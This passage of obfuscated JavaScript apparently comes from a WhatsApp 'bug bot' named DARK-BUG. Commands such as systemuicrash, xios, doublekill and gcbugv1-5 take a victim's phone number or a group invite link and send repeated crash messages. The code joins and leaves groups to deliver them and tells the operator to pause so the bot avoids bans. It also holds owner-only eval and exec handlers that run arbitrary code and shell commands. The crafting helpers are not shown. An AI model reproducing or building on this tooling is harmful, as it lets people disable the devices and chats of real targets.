          if (!_0x327751) {
            return _0x5264ea("𝕰𝖝𝖆𝖒𝖕𝖑𝖊 𝖚𝖘𝖆𝖌𝖊: " + (_0x4ca7f9 + _0x4210ff) + " 5");
          }
          if (isNaN(parseInt(_0x327751))) {
            return _0x5264ea("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
          }
          let _0x2dcc48 = encodeURI(_0x327751) * 0xc8;
          _0x5264ea("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙, " + _0x4210ff + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘...");
          await sleep(0x5dc);
          _0xf9e938(_0x1c6c8b, _0x2dcc48);
          await sleep(0x9c4);
          _0x50f95f('✅');
        }
        break;
      case 'xandroid2':
      case 'onekill':
      case "oneclickall":
      case "xsamsung":
      case "xwaweb":
      case 'doublekill':
      case "triplekill":
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          if (!_0x440a12) {
            return _0x5264ea("𝕿𝖍𝖎𝖘 𝖋𝖊𝖆𝖙𝖚𝖗𝖊 𝖎𝖘 𝖋𝖔𝖗 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖔𝖓𝖑𝖞!");
          }
          if (!_0x327751) {
            return _0x5264ea("𝕰𝖝𝖆𝖒𝖕𝖑𝖊 𝖚𝖘𝖆𝖌𝖊: " + (_0x4ca7f9 + _0x4210ff) + " 5");
          }
          if (isNaN(parseInt(_0x327751))) {
            return _0x5264ea("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
          }
          let _0x254e7c = encodeURI(_0x327751) * 0xc8;
          _0x5264ea("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙, " + _0x4210ff + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘...");
          await sleep(0x5dc);
          _0x5edea5(_0x1c6c8b, _0x254e7c);
          await sleep(0x9c4);
          _0x50f95f('✅');
        }
        break;
      case "xgc":
      case "gcbugv1":
      case "gcbugv2":
      case "gcbugv3":
      case "gcbugv4":
      case 'gcbugv5':
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          if (!_0x327751) {
            return _0x5264ea("𝐇𝐎𝐖 𝐓𝐎 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆 𝐓𝐎 𝐆𝐑𝐎𝐔𝐏\n\n" + (_0x4ca7f9 + _0x4210ff) + " https://chat.whatsapp.com/xxxx\n\n𝐍𝐨𝐭𝐞: 𝐈𝐟 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐨 𝐬𝐞𝐧𝐝 𝐚 𝐥𝐚𝐫𝐠𝐞 𝐧𝐮𝐦𝐛𝐞𝐫 𝐨𝐟 𝐛𝐮𝐠𝐬, 𝐩𝐥𝐞𝐚𝐬𝐞 𝐭𝐲𝐩𝐞 𝐚𝐬 𝐟𝐨𝐥𝐥𝐨𝐰𝐬\n\n𝐄𝐱: ." + _0x4210ff + " 𝐥𝐢𝐧𝐤𝐠𝐜 𝐚𝐦𝐨𝐮𝐧𝐭\n\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞:\n." + _0x4210ff + " https://chat.whatsapp.com/xxxx 10");
          }
          _0x5264ea("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙, " + _0x4210ff + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘...");
          if (!_0x327751.split(" ")[0x0].includes('whatsapp.com')) {
            return _0x5264ea("𝕷𝖎𝖓𝖐 𝕴𝖓𝖛𝖆𝖑𝖎𝖉!");
          }
          let _0x3923ce = _0x327751.split(" ")[0x0].split("https://chat.whatsapp.com/")[0x1];
          try {
            let _0x16d3cb = _0x327751.split(" ")[0x1] ? _0x327751.split(" ")[0x1] : '1';
            let _0x2f6815 = await _0x486fbc.groupAcceptInvite(_0x3923ce);
            await sleep(0x7d0);
            _0x389fb9(_0x2f6815, _0x16d3cb);
            await sleep(0x9c4);
            _0x5264ea("𝐃𝐎𝐍𝐄✅ 𝐁𝐔𝐆 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐒𝐄𝐍𝐓 𝐓𝐎 𝐓𝐇𝐄 𝐆𝐑𝐎𝐔𝐏!.");
            _0x486fbc.groupLeave(_0x2f6815);
          } catch (_0x1111c3) {
            _0x5264ea(util.format(_0x1111c3));
          }
        }
        break;
      case 'systemuicrash':
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          if (!_0x327751) {
            return _0x5264ea("𝖀𝖘𝖊 " + (_0x4ca7f9 + _0x4210ff) + " 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 " + (_0x4ca7f9 + _0x4210ff) + " 241xxxxxxxxxx,5");
          }
          let _0xc388be = _0x327751.split(',')[0x0];
          let _0x407a55 = _0x327751.split(',')[0x1] * 0x5;
          if (!_0xc388be || !_0x407a55) {
            return _0x5264ea("𝖀𝖘𝖊 " + (_0x4ca7f9 + _0x4210ff) + " 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 " + (_0x4ca7f9 + _0x4210ff) + " 241xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x407a55))) {
            return _0x5264ea("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
          }
          let _0x2e0083 = _0xc388be.replace(/[^0-9]/g, '');
          let _0x5202d4 = '' + encodeURI(_0x407a55);
          var _0x9254ba = await _0x486fbc.onWhatsApp(_0x2e0083 + '@s.whatsapp.net');
          let _0x89d416 = _0x2e0083 + '@s.whatsapp.net';
          if (_0x2e0083 == '24102150169') {
            return;
          }
          if (_0x9254ba.length == 0x0) {
            return _0x5264ea("𝐓𝐡𝐞 𝐧𝐮𝐦𝐛𝐞𝐫 𝐢𝐬 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝 𝐨𝐧 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩");
          }
          _0x5264ea("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙, " + _0x4210ff + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘...");
          await sleep(0x7d0);
          _0x960439(_0x89d416, _0x5202d4);
          await sleep(0x9c4);
          _0xdb78f5("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + _0x89d416.split('@')[0x0] + " 𝖀𝖘𝖎𝖓𝖌 *" + _0x4210ff + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", [_0x89d416]);
        }
        break;
      case "xsysui":
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          if (!_0x327751) {
            return _0x5264ea("𝖀𝖘𝖊 " + (_0x4ca7f9 + _0x4210ff) + " 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 " + (_0x4ca7f9 + _0x4210ff) + " 241xxxxxxxxxx,5");
          }
          let _0x507a3b = _0x327751.split(',')[0x0];
          let _0x438604 = _0x327751.split(',')[0x1] * 0x5;
          if (!_0x507a3b || !_0x438604) {
            return _0x5264ea("𝖀𝖘𝖊 " + (_0x4ca7f9 + _0x4210ff) + " 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 " + (_0x4ca7f9 + _0x4210ff) + " 241xxxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x438604))) {
            return _0x5264ea("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
          }
          let _0x36575a = _0x507a3b.replace(/[^0-9]/g, '');
          let _0x3c7fe3 = '' + encodeURI(_0x438604);
          var _0x9254ba = await _0x486fbc.onWhatsApp(_0x36575a + '@s.whatsapp.net');
          let _0x3146c7 = _0x36575a + '@s.whatsapp.net';
          if (_0x36575a == "24102150169") {
            return;
          }
          if (_0x9254ba.length == 0x0) {
            return _0x5264ea("𝐓𝐡𝐞 𝐧𝐮𝐦𝐛𝐞𝐫 𝐢𝐬 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝 𝐨𝐧 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩");
          }
          _0x5264ea("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙, " + _0x4210ff + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘..");
          await sleep(0x7d0);
          _0xca15cd(_0x3146c7, _0x3c7fe3);
          await sleep(0x9c4);
          _0xdb78f5("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + _0x3146c7.split('@')[0x0] + " 𝖀𝖘𝖎𝖓𝖌 *" + _0x4210ff + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", [_0x3146c7]);
        }
        break;
      case "clearall":
        {
          if (!_0x36f85a) {
            return _0x5264ea(mess.owner);
          }
          _0x486fbc.chatModify({
            'delete': true,
            'lastMessages': [{
              'key': _0xa01f7.key,
              'messageTimestamp': _0xa01f7.messageTimestamp
            }]
          }, _0xa01f7.chat);
        }
        break;
      case "clearchat":
        _0x11e7db("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
        break;
      case 'menu':
      case 'help':
      case "alive":
      case "bug":
      case "allmenu":
        let _0x249f02 = "\n╭──☠︎「 𝗗𝗔𝗥𝗞-𝗕𝗨𝗚 」☠︎\n├ *HI 🙇*\n├ *" + _0xa01f7.pushName + "* \n├ *" + xeonytimewisher + " 😄* \n╰─┬────⦾ " + readmore + "\n╭─┴⭕「 𝙾𝚆𝙽𝙴𝚁 」⭕\n│❏ getsession\n│❏ deletesession\n│❏ join\n│❏ shutdown  \n│❏ restart\n│❏ autoread\n│❏ autotyping\n│❏ autorecording\n│❏ autorecordtyp\n│❏ autobio\n│❏ autoswview\n│❏ mode\n│❏ block\n│❏ unblock \n│❏ backup\n│❏ getcase\n│❏ addowner\n│❏ delowner\n╰─┬────⦾\n╭─┴⦾「 𝚅𝙸𝚁𝚃𝙴𝚇 」❍\n│❏ xandroid\n│❏ xandroid2\n│❏ bugv1\n│❏ bugv2\n│❏ bugv3\n│❏ bugv4\n│❏ bugv5\n│❏ xios\n│❏ xios2\n│❏ iosx\n│❏ ioskill\n│❏ oneclickall\n│❏ xsamsung\n│❏ xwaweb\n│❏ doublekill\n│❏ triplekill\n│❏ xgc\n│❏ gcbugv1\n│❏ gcbugv2\n│❏ gcbugv3\n│❏ gcbugv4\n│❏ gcbugv5\n│❏ systemuicrash\n│❏ xsysui\n╰─┬────⦾\n╭─┴⦾「 𝙶𝚁𝙾𝚄𝙿 」⦾\n│❏ closetime\n│❏ opentime\n│❏ kick\n│❏ add\n│❏ promote\n│❏ demote\n│❏ setdesc\n│❏ setppgc\n│❏ tagall\n│❏ hidetag\n│❏ totag\n│❏ group\n│❏ editinfo\n│❏ linkgc\n│❏ revoke\n│❏ listonline\n╰─┬────⦾\n╭─┴⦾「 𝙼𝙰𝙸𝙽 」⦾\n│❏ menu\n│❏ buypremium\n│❏ runtime\n│❏ script\n│❏ donate\n│❏ owner\n╰─┬────⦾\n╭─┴⦾「 𝙲𝙾𝙽𝚅𝙴𝚁𝚃𝙴𝚁 」⦾\n│❏ sticker\n│❏ smeme\n│❏ take\n│❏ toimage\n│❏ tovideo\n│❏ toaudio\n│❏ tomp3\n│❏ tovn\n│❏ togif\n│❏ tourl\n│❏ toqr\n│❏ toviewonce\n│❏ fliptext\n│❏ emojimix\n╰─┬────⦾\n╭─┴⦾「 𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴 」❍\n│❏ addvideo\n│❏ addimage\n│❏ addsticker\n│❏ addvn\n│❏ addzip\n│❏ addapk\n│❏ addpdf\n│❏ delvideo\n│❏ delimage\n│❏ delsticker\n│❏ delvn\n│❏ delzip\n│❏ delapk\n│❏ delpdf\n│❏ listvideo\n│❏ listimage\n│❏ liststicker\n│❏ listvn\n│❏ listzip\n│❏ listapk\n│❏ listpdf\n╰─┬────⦾\n╭─┴⦾「 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳 」⦾\n│❏ play\n│❏ ytmp3\n│❏ ytmp4\n╰──────────⦾";
        if (typemenu === 'v1') {
          _0x486fbc.sendMessage(_0xa01f7.chat, {
            'text': _0x249f02,
            'contextInfo': {
              'externalAdReply': {
                'title': botname,
                'body': ownername,
                'thumbnailUrl': "https://i.imgur.com/L8mk6Fb.jpeg",
                'sourceUrl': link,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0xa01f7
          });
        } else {
          if (typemenu === 'v2') {
            _0x486fbc.sendMessage(_0xa01f7.chat, {
              'video': fs.readFileSync("./lib/theme/bug.mp4"),
              'gifPlayback': true,
              'caption': _0x249f02,
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': ownername,
                  'thumbnailUrl': '',
                  'sourceUrl': 'https://whatsapp.com/channel/0029VagsKCm2Jl8MLtsO733W',
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0xa01f7
            });
          } else {
            if (typemenu === 'v3') {
              _0x486fbc.sendMessage(_0xa01f7.chat, {
                'video': fs.readFileSync("./lib/theme/bug.mp4"),
                'caption': _0x249f02,
                'gifPlayback': true
              }, {
                'quoted': _0xa01f7
              });
            } else if (typemenu === 'v4') {
              _0x486fbc.relayMessage(_0xa01f7.chat, {
                'scheduledCallCreationMessage': {
                  'callType': "AUDIO",
                  'scheduledTimestampMs': 0x4b0,
                  'title': _0x249f02
                }
              }, {});
            }
          }
        }
        break;
      default:
        if (_0x36b760.startsWith('=>')) {
          if (!_0x36f85a) {
            return _0x5264ea(mess.owner);
          }
          try {
            _0x5264ea(util.format(eval("(async () => { return " + _0x36b760.slice(0x3) + " })()")));
          } catch (_0x344100) {
            _0x5264ea(String(_0x344100));
          }
        }
        if (_0x36b760.startsWith('>')) {
          if (!_0x36f85a) {
            return _0x5264ea(mess.owner);
          }
          try {
            let _0x547931 = await eval(_0x36b760.slice(0x2));
            if (typeof _0x547931 !== 'string') {
              _0x547931 = require('util').inspect(_0x547931);
            }
            await _0x5264ea(_0x547931);
          } catch (_0x2fa792) {
            await _0x5264ea(String(_0x2fa792));
          }
        }
        if (_0x36b760.startsWith('$')) {
          if (!_0x36f85a) {
            return _0x5264ea(mess.owner);
          }
          exec(_0x36b760.slice(0x2), (_0x3ad8cf, _0x16cc98) => {
            if (_0x3ad8cf) {
              return _0x5264ea(_0x3ad8cf);
            }
            if (_0x16cc98) {
              return _0x5264ea(_0x16cc98);
            }
          });
        }
    }
  } catch (_0x1cc4b7) {
    _0x486fbc.sendText(ownernumber + '@s.whatsapp.net', util.format(_0x1cc4b7), _0xa01f7);
    console.log(util.format(_0x1cc4b7));
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});
process.on("uncaughtException", function (_0x563860) {
  let _0x58e6a3 = String(_0x563860);
  if (_0x58e6a3.includes('conflict')) {
    return;
  }
  if (_0x58e6a3.includes("Socket connection timeout")) {
    return;
  }
  if (_0x58e6a3.includes('not-authorized')) {
    return;
  }
  if (_0x58e6a3.includes("already-exists")) {
    return;
  }
  if (_0x58e6a3.includes("rate-overlimit")) {
    return;
  }
  if (_0x58e6a3.includes("Connection Closed")) {
    return;
  }
  if (_0x58e6a3.includes("Timed Out")) {
    return;
  }
  if (_0x58e6a3.includes("Value not found")) {
    return;
  }
  console.log("Caught exception: ", _0x563860);
});